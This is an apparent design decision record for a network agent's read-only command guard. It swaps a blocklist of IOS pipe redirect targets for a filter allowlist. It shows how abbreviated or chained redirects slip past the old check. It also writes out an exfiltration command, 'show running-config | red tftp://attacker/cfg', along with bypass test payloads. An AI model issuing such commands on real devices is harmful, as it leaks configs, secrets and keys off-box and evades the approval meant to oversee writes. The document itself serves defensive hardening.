# Read-path pipe check: a filter allowlist, not a write-target blocklist

- Status: accepted
- Date: 2026-08-10
- Scope: `netagent/devices.py` read-path command guard (`_read_command_rejection`)
- Follows: `2026-08-08-read-path-command-allowlist.md` (#17); closes a residual in it

## Problem

#17 replaced the read path's leading-verb *blocklist* with a positive verb
allowlist — a command must start with `show`/`ping`/`traceroute`, full word — and
this half is sound (abbreviated read verbs like `sh` are refused). But the pipe
sub-check was left as a **full-word blocklist** of output-redirect targets:

```python
_PIPE_WRITE_TARGETS = frozenset({"redirect", "tee", "append"})
```

Cisco IOS / IOS-XE accept minimum-unique abbreviations for output modifiers, so
the blocklist misses `redirect` → `red`/`redi`/`redir`, `tee` → `te`, `append` →
`a`/`ap`. It also inspects only the tokens after the *first* `|`, so a filter
segment in front of a redirect (`show run | section bgp | red flash:x`) hides it.

`run_show` is a READ tool — the boundary runs it without an approval — so this
guard is the *only* per-command enforcement of read-only (invariant 1). The miss
turns the read path into an unapproved write path, and worse: `| redirect`
accepts remote destinations (`tftp:`/`ftp:`/`scp:`/`http:`), so
`show running-config | red tftp://attacker/cfg` exfiltrates the full config —
`enable secret`, keys, SNMP communities — off-box, logged as an allowed read.

This is the exact vector #17, its design doc, the CHANGELOG, the threat model,
and conformance item C2 all claim is closed.

## Decision

Make the pipe check a **positive allowlist**, matching the leading-verb design.
After each `|`, the segment's first token must be a known read/display filter:

```python
_READ_FILTERS = frozenset({"include", "exclude", "begin", "section", "count"})
```

full word only — abbreviations refused, the same rule the leading verb already
follows ("the agent surface emits full verbs; refusing abbreviations keeps the
allowlist unambiguous"). Every pipe segment is checked, not just the first, so a
chained `| filter | redirect` cannot smuggle a write behind a legal filter.
Anything unrecognized — `redirect`/`tee`/`append`, their abbreviations, or any
modifier not on the list — fails closed.

## Consequences

- Closes the write/exfiltration bypass on the read path; `show run | red …`,
  `| te …`, `| a …`, and chained forms are refused before `send_command`.
- Legitimate filter pipes (`| include`, `| exclude`, `| begin`, `| section`,
  `| count`) still pass, full word.
- Abbreviated filters (`| i`, `| sec`) are now refused. This is a deliberate
  false-positive: the agent surface emits full words, and an unambiguous
  allowlist is worth more than the convenience of abbreviations on the read path.
- No change to invariants 2–4 or the approved write path; this only tightens the
  read guard.

## Tests

`tests/test_read_path_guard.py` gains the abbreviation matrix (`| red`, `| redi`,
`| te`, `| a`, `| ap`), the chained-pipe case (`| section bgp | red flash:x`),
and remote-destination redirects, each asserting a refusal *and* that nothing
reached `send_command`; legit filter pipes stay in the allowed set. Conformance
`_check_c2` gains an abbreviated-redirect payload so its regression guard has
teeth here.
